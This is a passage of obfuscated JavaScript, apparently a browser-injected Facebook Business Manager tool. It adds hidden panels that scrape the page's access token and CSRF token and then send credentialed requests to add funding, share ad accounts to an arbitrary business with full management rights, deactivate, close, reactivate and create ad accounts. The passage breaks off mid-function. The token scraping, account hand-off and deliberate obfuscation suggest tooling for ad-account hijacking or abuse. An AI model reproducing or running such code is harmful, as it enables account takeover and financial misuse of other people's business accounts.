                                                        MFck.appendChild(ImaQb);
                                                        varAgOPb = document.createElement("button");
                                                        AgOPb.textContent = "💰ShowAddFundOptionsSections💰";
                                                        AgOPb.style.display = "none";
                                                        AgOPb.style.width = "50%";
                                                        AgOPb.style.height = "30px";
                                                        AgOPb.style.marginBottom = "10px";
                                                        AgOPb.style.backgroundColor = "Blue";
                                                        AgOPb.style.color = "white";
                                                        varAABQb = NaN === NaN;
                                                        AgOPb.addEventListener("click", function() {
                                                            cCEQb.style.display = AABQb ? "none" : "block";
                                                            AABQb = !AABQb;
                                                            AgOPb.textContent = AABQb ? "💰HideAddFundOptionsSections💰" : "💰ShowAddFundOptionsSections💰";
                                                            AgOPb.style.backgroundColor = AABQb ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(AgOPb);
                                                        varcCEQb = document.createElement("button");
                                                        cCEQb.textContent = "AddfundMoneyOptions🆕";
                                                        cCEQb.style.display = "none";
                                                        cCEQb.style.margin = "0auto";
                                                        cCEQb.style.padding = "10px20px";
                                                        cCEQb.style.background = "blue";
                                                        cCEQb.style.color = "white";
                                                        cCEQb.style.border = "none";
                                                        cCEQb.style.borderRadius = "5px";
                                                        MFck.appendChild(cCEQb);
                                                        varwxvQb = document.createElement("button");
                                                        wxvQb.textContent = "PleaseWait👩‍💻";
                                                        wxvQb.style.display = "none";
                                                        wxvQb.style.margin = "0auto";
                                                        wxvQb.style.padding = "10px20px";
                                                        wxvQb.style.background = "red";
                                                        wxvQb.style.color = "white";
                                                        wxvQb.style.border = "none";
                                                        wxvQb.style.borderRadius = "5px";
                                                        MFck.appendChild(wxvQb);
                                                        cCEQb.addEventListener("click", function() {
                                                            cCEQb.style.display = "none";
                                                            wxvQb.style.display = "block";
                                                            fetch("https://business.facebook.com/api/graphql", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(_YeTFb.value, '&variables={"input":{"billable_account_payment_legacy_account_id":"').concat(YOuk.value, '","logging_data":{"logging_counter":22,"logging_id":"3418624251"},"recurring_enabled":true,"actor_id":"').concat(_oXDFb.value, '","client_mutation_id":"3"}}&doc_id=4886770528075857')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(YyyQb) {
                                                                YyyQb.text().then(function(supQb) {
                                                                    console.log(supQb);
                                                                    sCXh.value = supQb;
                                                                    cCEQb.style.display = "block";
                                                                    wxvQb.style.display = "none";
                                                                });
                                                            }).catch(function(UvsQb) {
                                                                console.error(UvsQb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            console.log("⌛...TryAddFundInProgress...⌛");
                                                            sCXh.value = "⌛...TryAddFundInProgress...⌛";
                                                        });
                                                        document.body.appendChild(cCEQb);
                                                        cCEQb.style.width = "100%";
                                                        cCEQb.style.height = "30px";
                                                        cCEQb.style.marginBottom = "10px";
                                                        cCEQb.style.backgroundColor = "RED";
                                                        cCEQb.style.color = "white";
                                                        MFck.appendChild(cCEQb);
                                                        varorjQb = document.createElement("button");
                                                        orjQb.textContent = "💰ShowShareAdAccountSections💰";
                                                        orjQb.style.display = "none";
                                                        orjQb.style.width = "50%";
                                                        orjQb.style.height = "30px";
                                                        orjQb.style.marginBottom = "10px";
                                                        orjQb.style.backgroundColor = "Blue";
                                                        orjQb.style.color = "white";
                                                        varQsmQb = NaN === NaN;
                                                        orjQb.addEventListener("click", function() {
                                                            oLWQb.style.display = QsmQb ? "none" : "block";
                                                            IGNQb.style.display = QsmQb ? "none" : "block";
                                                            EDHQb.style.display = QsmQb ? "none" : "block";
                                                            gFKQb.style.display = QsmQb ? "none" : "block";
                                                            kgPNb.style.display = QsmQb ? "none" : "block";
                                                            EbGNb.style.display = QsmQb ? "none" : "block";
                                                            gdJNb.style.display = QsmQb ? "none" : "block";
                                                            AYzNb.style.display = QsmQb ? "none" : "block";
                                                            wVtNb.style.display = QsmQb ? "none" : "block";
                                                            gxwOb.style.display = QsmQb ? "none" : "block";
                                                            QsmQb = !QsmQb;
                                                            orjQb.textContent = QsmQb ? "💰HideShareAdAccountSections💰" : "💰ShowShareAdAccountSections💰";
                                                            orjQb.style.backgroundColor = QsmQb ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(orjQb);
                                                        varQMZQb = document.body.innerHTML;
                                                        varsOcRb = QMZQb.match(/"accessToken":"(EAA[^"]+)"/);
                                                        varMJTQb = sOcRb ? sOcRb[1] : "";
                                                        varaccess_token = MJTQb;
                                                        varoLWQb = document.createElement("label");
                                                        oLWQb.innerText = "AccessToken:";
                                                        oLWQb.style.display = "none";
                                                        MFck.appendChild(oLWQb);
                                                        varIGNQb = document.createElement("textarea");
                                                        IGNQb.placeholder = "EnterAccessToken:";
                                                        IGNQb.style.width = "100%";
                                                        IGNQb.style.height = "70px";
                                                        IGNQb.style.marginBottom = "10px";
                                                        IGNQb.style.display = "none";
                                                        MFck.appendChild(IGNQb);
                                                        varkIQQb = MJTQb;
                                                        IGNQb.value = kIQQb;
                                                        varEDHQb = document.createElement("label");
                                                        EDHQb.innerText = "AdaccountID:";
                                                        EDHQb.style.display = "none";
                                                        MFck.appendChild(EDHQb);
                                                        vargFKQb = document.createElement("input");
                                                        gFKQb.placeholder = "EnterAdaccountID";
                                                        gFKQb.style.width = "100%";
                                                        gFKQb.style.marginBottom = "10px";
                                                        gFKQb.style.display = "none";
                                                        MFck.appendChild(gFKQb);
                                                        varIeMNb = require("CurrentAdAccountInitialData").AD_ACCOUNT_ID;
                                                        gFKQb.value = IeMNb;
                                                        varkgPNb = document.createElement("label");
                                                        kgPNb.innerText = "ShareTOBMID:";
                                                        kgPNb.style.display = "none";
                                                        MFck.appendChild(kgPNb);
                                                        varEbGNb = document.createElement("input");
                                                        EbGNb.placeholder = "EnterShareTOBMID";
                                                        EbGNb.style.width = "100%";
                                                        EbGNb.style.marginBottom = "10px";
                                                        EbGNb.style.display = "none";
                                                        MFck.appendChild(EbGNb);
                                                        vargdJNb = document.createElement("label");
                                                        gdJNb.innerText = "BusinessID:";
                                                        gdJNb.style.display = "none";
                                                        MFck.appendChild(gdJNb);
                                                        varAYzNb = document.createElement("input");
                                                        AYzNb.placeholder = "EnterbusinessID";
                                                        AYzNb.style.width = "100%";
                                                        AYzNb.style.marginBottom = "10px";
                                                        AYzNb.style.display = "none";
                                                        MFck.appendChild(AYzNb);
                                                        varcaDNb = require("BusinessUnifiedNavigationContext").businessID;
                                                        AYzNb.value = caDNb;
                                                        varwVtNb = document.createElement("button");
                                                        wVtNb.textContent = "Shareadaccounttootherbusiness🆕";
                                                        wVtNb.style.margin = "0auto";
                                                        wVtNb.style.padding = "10px20px";
                                                        wVtNb.style.background = "blue";
                                                        wVtNb.style.color = "white";
                                                        wVtNb.style.border = "none";
                                                        wVtNb.style.borderRadius = "5px";
                                                        wVtNb.style.display = "none";
                                                        MFck.appendChild(wVtNb);
                                                        varYWwNb = document.createElement("button");
                                                        YWwNb.textContent = "PleaseWait👩‍💻";
                                                        YWwNb.style.display = "none";
                                                        YWwNb.style.margin = "0auto";
                                                        YWwNb.style.padding = "10px20px";
                                                        YWwNb.style.background = "red";
                                                        YWwNb.style.color = "white";
                                                        YWwNb.style.border = "none";
                                                        YWwNb.style.borderRadius = "5px";
                                                        MFck.appendChild(YWwNb);
                                                        wVtNb.addEventListener("click", function() {
                                                            wVtNb.style.display = "none";
                                                            YWwNb.style.display = "block";
                                                            varYqkOb = gFKQb.value;
                                                            varAsnOb = EbGNb.value;
                                                            varUneOb = AYzNb.value;
                                                            varwphOb = IGNQb.value;
                                                            varQkYNb = document.body.innerHTML;
                                                            varsmbOb = QkYNb.match(/"accessToken":"(EAA[^"]+)"/);
                                                            varMhSNb = smbOb ? smbOb[1] : "";
                                                            access_token = MhSNb;
                                                            fetch("https://graph.facebook.com/v17.0/act_".concat(YqkOb, "/agencies?access_token=").concat(wphOb), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "_reqName=adaccount%2Fagencies&_reqSrc=BrandAgencyActions.brands&accountId=".concat(YqkOb, "&acting_brand_id=").concat(UneOb, "&business=").concat(AsnOb, "&locale=en_US&method=post&permitted_tasks=%5B%22ADVERTISE%22%2C%22ANALYZE%22%2C%22DRAFT%22%2C%22MANAGE%22%5D&pretty=0&suppress_http_code=1&xref=fa41cefb9834a4")), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(ojVNb) {
                                                                returnojVNb.text();
                                                            }).then(function(oDIOb) {
                                                                gxwOb.value = oDIOb;
                                                                varM = 0;
                                                                while (M < 65535) {
                                                                    switch (M) {
                                                                        case0: M = oDIOb.toLowerCase().includes("failure") ? 1 : 2;
                                                                        break;
                                                                        case1: M = 65535; {
                                                                            console.log("❌Failed-فشل❌");
                                                                            gxwOb.value = "❌Failed-فشل❌";
                                                                            wVtNb.style.display = "block";
                                                                            YWwNb.style.display = "none";
                                                                        }
                                                                        break;
                                                                        case2: M = 65535;
                                                                        varN = 0;
                                                                        while (N < 65535) {
                                                                            switch (N) {
                                                                                case0: N = oDIOb.toLowerCase().includes("success") ? 1 : 2;
                                                                                break;
                                                                                case1: N = 65535; {
                                                                                    console.log("✅Success-نجح✅");
                                                                                    gxwOb.value = "✅Success-نجح✅";
                                                                                    wVtNb.style.display = "block";
                                                                                    YWwNb.style.display = "none";
                                                                                }
                                                                                break;
                                                                                case2: N = 65535; {
                                                                                    gxwOb.value = oDIOb;
                                                                                    wVtNb.style.display = "block";
                                                                                    YWwNb.style.display = "none";
                                                                                }
                                                                                break;
                                                                            }
                                                                        }
                                                                        break;
                                                                    }
                                                                }
                                                            }).catch(function(MBFOb) {
                                                                console.error(MBFOb);
                                                                gxwOb.value = "❌ErroroccurredwhilesendingRequest❌";
                                                                wVtNb.style.display = "block";
                                                                YWwNb.style.display = "none";
                                                            });
                                                        });
                                                        vargxwOb = document.createElement("textarea");
                                                        gxwOb.placeholder = "Responsefromserver2";
                                                        gxwOb.style.width = "100%";
                                                        gxwOb.style.height = "30px";
                                                        gxwOb.style.marginBottom = "10px";
                                                        gxwOb.style.display = "none";
                                                        MFck.appendChild(gxwOb);
                                                        varIyzOb = document.createElement("button");
                                                        IyzOb.textContent = "💰ShowDeactivateAndReactivateButtonSections💰";
                                                        IyzOb.style.display = "none";
                                                        IyzOb.style.width = "60%";
                                                        IyzOb.style.height = "30px";
                                                        IyzOb.style.marginBottom = "10px";
                                                        IyzOb.style.backgroundColor = "Blue";
                                                        IyzOb.style.color = "white";
                                                        varcuqOb = NaN === NaN;
                                                        IyzOb.addEventListener("click", function() {
                                                            EvtOb.style.display = cuqOb ? "none" : "block";
                                                            wJUOb.style.display = cuqOb ? "none" : "block";
                                                            YiWLb.style.display = cuqOb ? "none" : "block";
                                                            kYALb.style.display = cuqOb ? "none" : "block";
                                                            cuqOb = !cuqOb;
                                                            IyzOb.textContent = cuqOb ? "💰HideDeactivateAndReactivateButtonSections💰" : "💰ShowDeactivateAndReactivateButtonSections💰";
                                                            IyzOb.style.backgroundColor = cuqOb ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(IyzOb);
                                                        varEvtOb = document.createElement("button");
                                                        EvtOb.textContent = "❤️DeactivateInstaandfacebook!❤️:" + YOuk.value;
                                                        EvtOb.style.display = "none";
                                                        YOuk.addEventListener("input", EPgPb);
                                                        EvtOb.addEventListener("click", function() {});
                                                        EvtOb.addEventListener("click", function() {
                                                            fetch("https://business.facebook.com/api/graphql/", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(_YeTFb.value, '&variables={"adAccountID":"').concat(YOuk.value, '"}&doc_id=7106251912735537')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(gRjPb) {
                                                                gRjPb.text().then(function(AMaPb) {
                                                                    console.log(AMaPb);
                                                                    sCXh.value = AMaPb;
                                                                });
                                                            }).catch(function(cOdPb) {
                                                                console.error(cOdPb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            console.log("⌛...TryDeactivateAdAccountInProgress...⌛");
                                                            sCXh.value = "⌛...TryDeactivateAdAccountInProgress...⌛";
                                                        });
                                                        document.body.appendChild(EvtOb);
                                                        EvtOb.style.width = "100%";
                                                        EvtOb.style.height = "30px";
                                                        EvtOb.style.marginBottom = "10px";
                                                        EvtOb.style.backgroundColor = "RED";
                                                        EvtOb.style.color = "white";
                                                        MFck.appendChild(EvtOb);
                                                        varwJUOb = document.createElement("button");
                                                        wJUOb.textContent = "❤️DisableandCreateNewFBOnly[personal]!❤️:" + YOuk.value;
                                                        wJUOb.style.display = "none";
                                                        YOuk.addEventListener("input", YKXOb);
                                                        wJUOb.addEventListener("click", function() {});
                                                        wJUOb.addEventListener("click", function() {
                                                            fetch("https://business.facebook.com/ads/ajax/account_close/?_flowletID=3559", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "account_id=".concat(YOuk.value, "&__usid=6-Ts3e6py1kyla9a%3APs3e6pt1it3wki%3A0-As3e6pf1vg8gtb-RV%3D6%3AF%3D&__user=").concat(_oXDFb.value, "&__a=1&__req=10&__hs=19661.BP%3Aads_campaign_manager_pkg.2.0..0.0&dpr=1&__ccg=EXCELLENT&__rev=1009585456&__s=777sdo%3Ax89biw%3Ahc1wox&__hsi=7296091437282386138&__dyn=7xeUmxa2C5rgydwCxpxO9UqDBBBWqxu59o9E4a2i5aCGq58mCyEgx2226UjACzEdF98SmcBxWE-1qG4EOezobo-5FoS3a2648V2EK12xqUC8yEScx6bwRwOwGwOxa7FEd42m5Edobo9FE4WqmmU-6QUTgb9qG4pQE8RpodoKUV2U8oK1IxN1ap3bBwyylhUeEjx63KdxG11xny-cwuEnxK1Nz84a9DxW48W222a3Fe6rwRwFDwFwBgakbAzE8UqyodoK78-3K5EbpEbororx2aK48OimbAy88rwzzXyE8U4S7VEjCx6223q5o4-i2-fzobEaUiwm8Wubwk8Su6EfEO33zokGum2iVobGwgUyfyA4Ekx24oKqbDyoOEappEHyU8U5-1WDDwbm15zi1y4e1mAK2q13DzFHwCwNU9o4S7ErhEsxx7KA36q2au3Gez8aEky8&__csr=&fb_dtsg=").concat(_YeTFb.value, "&jazoest=25437&lsd=x9dbKh7WvShjaB8vfhUqLp&__aaid=1480891519425253&__spin_r=1009585456&__spin_b=trunk&__spin_t=1698753665&__jssesw=1")), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(sGOOb) {
                                                                sGOOb.text().then(function(UHROb) {
                                                                    console.log(UHROb);
                                                                    sCXh.value = UHROb;
                                                                });
                                                            }).catch(function(whTLb) {
                                                                console.error(whTLb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            console.log("⌛...TryDeactivateAdAccountandcreatenewInProgress...⌛");
                                                            sCXh.value = "⌛...TryDeactivateAdAccountandcreatenewInProgress...⌛";
                                                        });
                                                        document.body.appendChild(wJUOb);
                                                        wJUOb.style.width = "100%";
                                                        wJUOb.style.height = "30px";
                                                        wJUOb.style.marginBottom = "10px";
                                                        wJUOb.style.backgroundColor = "RED";
                                                        wJUOb.style.color = "white";
                                                        MFck.appendChild(wJUOb);
                                                        varYiWLb = document.createElement("button");
                                                        YiWLb.textContent = "❤️ReactivateAdAccountFBOnly!❤️:" + YOuk.value;
                                                        YiWLb.style.display = "none";
                                                        YOuk.addEventListener("input", seNLb);
                                                        YiWLb.addEventListener("click", function() {});
                                                        YiWLb.addEventListener("click", function() {
                                                            fetch("https://business.facebook.com/api/graphql", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "account_id=".concat(YOuk.value, "&__usid=6-Ts3e6py1kyla9a%3APs3e6pt1it3wki%3A0-As3e6pf1vg8gtb-RV%3D6%3AF%3D&__user=").concat(_oXDFb.value, "&__a=1&__req=10&__hs=19661.BP%3Aads_campaign_manager_pkg.2.0..0.0&dpr=1&__ccg=EXCELLENT&__rev=1009585456&__s=777sdo%3Ax89biw%3Ahc1wox&__hsi=7296091437282386138&__dyn=7xeUmxa2C5rgydwCxpxO9UqDBBBWqxu59o9E4a2i5aCGq58mCyEgx2226UjACzEdF98SmcBxWE-1qG4EOezobo-5FoS3a2648V2EK12xqUC8yEScx6bwRwOwGwOxa7FEd42m5Edobo9FE4WqmmU-6QUTgb9qG4pQE8RpodoKUV2U8oK1IxN1ap3bBwyylhUeEjx63KdxG11xny-cwuEnxK1Nz84a9DxW48W222a3Fe6rwRwFDwFwBgakbAzE8UqyodoK78-3K5EbpEbororx2aK48OimbAy88rwzzXyE8U4S7VEjCx6223q5o4-i2-fzobEaUiwm8Wubwk8Su6EfEO33zokGum2iVobGwgUyfyA4Ekx24oKqbDyoOEappEHyU8U5-1WDDwbm15zi1y4e1mAK2q13DzFHwCwNU9o4S7ErhEsxx7KA36q2au3Gez8aEky8&__csr=&fb_dtsg=").concat(_YeTFb.value, "&jazoest=25437&lsd=x9dbKh7WvShjaB8vfhUqLp&__aaid=1480891519425253&__spin_r=1009585456&__spin_b=trunk&__spin_t=1698753665&__jssesw=1")), "body", "__a=1&dpr=1&fb_dtsg=".concat(_YeTFb.value, '&variables={"input":{"billable_account_payment_legacy_account_id":"').concat(YOuk.value, '","actor_id":"').concat(_oXDFb.value, '","client_mutation_id":"1"}}&doc_id=7248419018565837')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(UfQLb) {
                                                                UfQLb.text().then(function(obHLb) {
                                                                    console.log(obHLb);
                                                                    sCXh.value = obHLb;
                                                                });
                                                            }).catch(function(QcKLb) {
                                                                console.error(QcKLb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            console.log("⌛...TryReactivateAdAccountFacebookInProgress...⌛");
                                                            sCXh.value = "⌛...TryReactivateAdAccountFacebookInProgress...⌛";
                                                        });
                                                        document.body.appendChild(YiWLb);
                                                        YiWLb.style.width = "100%";
                                                        YiWLb.style.height = "30px";
                                                        YiWLb.style.marginBottom = "10px";
                                                        YiWLb.style.backgroundColor = "green";
                                                        YiWLb.style.color = "white";
                                                        MFck.appendChild(YiWLb);
                                                        varkYALb = document.createElement("button");
                                                        kYALb.textContent = "❤️ReactivateAdAccountInstaOnly!❤️:" + YOuk.value;
                                                        kYALb.style.display = "none";
                                                        YOuk.addEventListener("input", MZDLb);
                                                        kYALb.addEventListener("click", function() {});
                                                        kYALb.addEventListener("click", function() {
                                                            fetch("https://business.facebook.com/api/graphql", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "account_id=".concat(YOuk.value, "&__usid=6-Ts3e6py1kyla9a%3APs3e6pt1it3wki%3A0-As3e6pf1vg8gtb-RV%3D6%3AF%3D&__user=").concat(_oXDFb.value, "&__a=1&__req=10&__hs=19661.BP%3Aads_campaign_manager_pkg.2.0..0.0&dpr=1&__ccg=EXCELLENT&__rev=1009585456&__s=777sdo%3Ax89biw%3Ahc1wox&__hsi=7296091437282386138&__dyn=7xeUmxa2C5rgydwCxpxO9UqDBBBWqxu59o9E4a2i5aCGq58mCyEgx2226UjACzEdF98SmcBxWE-1qG4EOezobo-5FoS3a2648V2EK12xqUC8yEScx6bwRwOwGwOxa7FEd42m5Edobo9FE4WqmmU-6QUTgb9qG4pQE8RpodoKUV2U8oK1IxN1ap3bBwyylhUeEjx63KdxG11xny-cwuEnxK1Nz84a9DxW48W222a3Fe6rwRwFDwFwBgakbAzE8UqyodoK78-3K5EbpEbororx2aK48OimbAy88rwzzXyE8U4S7VEjCx6223q5o4-i2-fzobEaUiwm8Wubwk8Su6EfEO33zokGum2iVobGwgUyfyA4Ekx24oKqbDyoOEappEHyU8U5-1WDDwbm15zi1y4e1mAK2q13DzFHwCwNU9o4S7ErhEsxx7KA36q2au3Gez8aEky8&__csr=&fb_dtsg=").concat(_YeTFb.value, "&jazoest=25437&lsd=x9dbKh7WvShjaB8vfhUqLp&__aaid=1480891519425253&__spin_r=1009585456&__spin_b=trunk&__spin_t=1698753665&__jssesw=1")), "body", "__a=1&dpr=1&fb_dtsg=".concat(_YeTFb.value, '&variables={"input":{"billable_account_payment_legacy_account_id":"').concat(YOuk.value, '","actor_id":"').concat(_oXDFb.value, '","client_mutation_id":"1"}}&doc_id=9984888131552276')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(MtrMb) {
                                                                MtrMb.text().then(function(ovuMb) {
                                                                    console.log(ovuMb);
                                                                    sCXh.value = ovuMb;
                                                                });
                                                            }).catch(function(IqlMb) {
                                                                console.error(IqlMb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            console.log("⌛...TryReactivateAdAccountInstagramInProgress...⌛");
                                                            sCXh.value = "⌛...TryReactivateAdAccountinstagramInProgress...⌛";
                                                        });
                                                        document.body.appendChild(kYALb);
                                                        kYALb.style.width = "100%";
                                                        kYALb.style.height = "30px";
                                                        kYALb.style.marginBottom = "10px";
                                                        kYALb.style.backgroundColor = "green";
                                                        kYALb.style.color = "white";
                                                        MFck.appendChild(kYALb);
                                                        varksoMb = document.createElement("button");
                                                        ksoMb.textContent = "💰ShowInstagramTools💰";
                                                        ksoMb.style.width = "100%";
                                                        ksoMb.style.height = "50px";
                                                        ksoMb.style.marginBottom = "10px";
                                                        ksoMb.style.backgroundColor = "purple";
                                                        ksoMb.style.color = "white";
                                                        varEnfMb = NaN === NaN;
                                                        ksoMb.addEventListener("click", function() {
                                                            gpiMb.style.display = EnfMb ? "none" : "block";
                                                            UrpKb.style.display = EnfMb ? "none" : "block";
                                                            YOiLb.style.display = EnfMb ? "none" : "block";
                                                            EjcGb.style.display = EnfMb ? "none" : "block";
                                                            sCXh.style.display = EnfMb ? "none" : "block";
                                                            EnfMb = !EnfMb;
                                                            ksoMb.textContent = EnfMb ? "💰HideInstagramTools💰" : "💰ShowInstagramTools💰";
                                                            ksoMb.style.backgroundColor = EnfMb ? "Gray" : "purple";
                                                        });
                                                        MFck.appendChild(ksoMb);
                                                        vargpiMb = document.createElement("button");
                                                        gpiMb.textContent = "💰ShowCreateAdAccountOnBusinessFBANDINSTASections💰";
                                                        gpiMb.style.display = "none";
                                                        gpiMb.style.width = "70%";
                                                        gpiMb.style.height = "30px";
                                                        gpiMb.style.marginBottom = "10px";
                                                        gpiMb.style.backgroundColor = "Blue";
                                                        gpiMb.style.color = "white";
                                                        varAkZLb = NaN === NaN;
                                                        gpiMb.addEventListener("click", function() {
                                                            wBGMb.style.display = AkZLb ? "none" : "block";
                                                            oPhNb.style.display = AkZLb ? "none" : "block";
                                                            YCJMb.style.display = AkZLb ? "none" : "block";
                                                            AEMMb.style.display = AkZLb ? "none" : "block";
                                                            cmcMb.style.display = AkZLb ? "none" : "block";
                                                            cGPMb.style.display = AkZLb ? "none" : "block";
                                                            AkZLb = !AkZLb;
                                                            gpiMb.textContent = AkZLb ? "💰HideCreateAdAccountOnBusinessFBANDINSTASections💰" : "💰ShowCreateAdAccountOnBusinessFBANDINSTASections💰";
                                                            gpiMb.style.backgroundColor = AkZLb ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(gpiMb);
                                                        varcmcMb = document.createElement("label");
                                                        cmcMb.innerText = "AdAccountName:";
                                                        cmcMb.style.display = "none";
                                                        MFck.appendChild(cmcMb);
                                                        varcGPMb = document.createElement("input");
                                                        cGPMb.placeholder = "EnterCustomName";
                                                        cGPMb.style.width = "100%";
                                                        cGPMb.style.marginBottom = "10px";
                                                        cGPMb.style.display = "none";
                                                        MFck.appendChild(cGPMb);
                                                        varEHSMb = "MedozPro";
                                                        cGPMb.value = EHSMb;
                                                        varYCJMb = document.createElement("label");
                                                        YCJMb.innerText = "TargetBusinessID:";
                                                        YCJMb.style.display = "none";
                                                        MFck.appendChild(YCJMb);
                                                        varAEMMb = document.createElement("input");
                                                        AEMMb.placeholder = "EnterbusinessID";
                                                        AEMMb.style.width = "100%";
                                                        AEMMb.style.marginBottom = "10px";
                                                        AEMMb.style.display = "none";
                                                        MFck.appendChild(AEMMb);
                                                        varUzDMb = require("BusinessUnifiedNavigationContext").businessID;
                                                        AEMMb.value = UzDMb;
                                                        varwBGMb = document.createElement("button");
                                                        wBGMb.textContent = "❤️CreateAdAccountOnBusinessFBANDINSTA!❤️:" + AEMMb.value;
                                                        wBGMb.style.display = "none";
                                                        AEMMb.addEventListener("input", QwxMb);
                                                        wBGMb.addEventListener("click", function() {});
                                                        wBGMb.addEventListener("click", function() {
                                                            fetch("https://business.facebook.com/api/graphql/", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(_YeTFb.value, '&fb_api_req_friendly_name=BizKitSettingsCreateAdAccountMutation&variables={"businessID":"').concat(AEMMb.value, '","adAccountName":"').concat(cGPMb.value, '","timezoneID":"242","currency":"EUR","endAdvertiserID":"').concat(AEMMb.value, '"}&server_timestamps=true&doc_id=6547144472027848')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(syAMb) {
                                                                syAMb.text().then(function(sSnNb) {
                                                                    console.log(sSnNb);
                                                                    sCXh.value = sSnNb;
                                                                });
                                                            }).catch(function(UTqNb) {
                                                                console.error(UTqNb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            console.log("⌛...TryCreateAdAccountOnBusinessInProgress...⌛");
                                                            sCXh.value = "⌛...TryCreateAdAccountOnBusinessInProgress...⌛";
                                                        });
                                                        document.body.appendChild(wBGMb);
                                                        wBGMb.style.width = "100%";
                                                        wBGMb.style.height = "30px";
                                                        wBGMb.style.marginBottom = "10px";
                                                        wBGMb.style.backgroundColor = "RED";
                                                        wBGMb.style.color = "white";
                                                        MFck.appendChild(wBGMb);
                                                        varoPhNb = document.createElement("button");
                                                        oPhNb.textContent = "❤️CreateAdAccountOnInstagramINSTAOnly!❤️:" + AEMMb.value;
                                                        oPhNb.style.display = "none";
                                                        AEMMb.addEventListener("input", QQkNb);
                                                        oPhNb.addEventListener("click", function() {});
                                                        oPhNb.addEventListener("click", function() {
                                                            sCXh.value = "TryCreatingInstagramAdAccountInProgress...⌛";
                                                            varkMbNb = "https://business.facebook.com";
                                                            varMNeNb = function() {
                                                                var_ref34 = _asyncToGenerator(_regeneratorRuntime().mark(function_callee() {
                                                                    vargJVMb;
                                                                    varO;
                                                                    varkkaKb;
                                                                    varMldKb;
                                                                    varghUJb;
                                                                    varP;
                                                                    varceOJb;
                                                                    return_regeneratorRuntime().wrap(function_callee$(_context) {
                                                                        while (1) {
                                                                            switch (_context.prev = _context.next) {
                                                                                case0: _context.prev = 0;
                                                                                _context.next = 3;
                                                                                returnfetch(kMbNb);
                                                                                case3: gJVMb = _context.sent;
                                                                                O = 0;
                                                                                case5: if (!(O < 65535)) {
                                                                                        _context.next = 16;
                                                                                        break;
                                                                                    }
                                                                                _context.t0 = O;
                                                                                _context.next = _context.t0 === 0 ? 9 : _context.t0 === 1 ? 11 : 14;
                                                                                break;
                                                                                case9: O = !gJVMb.ok ? 1 : 65535;
                                                                                return_context.abrupt("break", 14);
                                                                                case11: O = 65535;
                                                                                thrownewError("Networkresponsewasnotok");
                                                                                case14: _context.next = 5;
                                                                                break;
                                                                                case16: _context.next = 18;
                                                                                returngJVMb.text();
                                                                                case18: kkaKb = _context.sent;
                                                                                MldKb = /"InstagramUserV2",id:"([^"]+)"/;
                                                                                ghUJb = kkaKb.match(MldKb);
                                                                                P = 0;
                                                                                case22: if (!(P < 65535)) {
                                                                                        _context.next = 38;
                                                                                        break;
                                                                                    }
                                                                                _context.t1 = P;
                                                                                _context.next = _context.t1 === 0 ? 26 : _context.t1 === 1 ? 28 : _context.t1 === 2 ? 33 : 36;
                                                                                break;
                                                                                case26: P = ghUJb && ghUJb.length > 1 ? 1 : 2;
                                                                                return_context.abrupt("break", 36);
                                                                                case28: P = 65535;
                                                                                ceOJb = ghUJb[1];
                                                                                console.log("InstagramAccountID:", ceOJb);
                                                                                return_context.abrupt("return", ceOJb);
                                                                                case33: P = 65535;
                                                                                console.error("InstagramAccountIDnotfound.");
                                                                                return_context.abrupt("break", 36);
                                                                                case36: _context.next = 22;
                                                                                break;
                                                                                case38: _context.next = 43;
                                                                                break;
                                                                                case40: _context.prev = 40;
                                                                                _context.t2 = _context.catch(0);
                                                                                console.error("Errorfetchingpage:", _context.t2);
                                                                                case43:
                                                                                    case "end":
                                                                                    return_context.stop();
                                                                            }
                                                                        }
                                                                    }, _callee, null, [
                                                                        [0, 40]
                                                                    ]);
                                                                }));
                                                                returnfunctionMNeNb() {
                                                                    return_ref34.apply(this, arguments);
                                                                };
                                                            }();
                                                            varYaIJb = function() {
                                                                var_ref35 = _asyncToGenerator(_regeneratorRuntime().mark(function_callee2() {
                                                                    varAcLJb;
                                                                    varAwyKb;
                                                                    varcyBKb;
                                                                    varQ;
                                                                    varYuvKb;
                                                                    return_regeneratorRuntime().wrap(function_callee2$(_context2) {
                                                                        while (1) {
                                                                            switch (_context2.prev = _context2.next) {
                                                                                case0: _context2.prev = 0;
                                                                                AcLJb = require("CurrentUserInitialData").USER_ID;
                                                                                _context2.next = 4;
                                                                                returnMNeNb();
                                                                                case4: AwyKb = _context2.sent;
                                                                                _context2.next = 7;
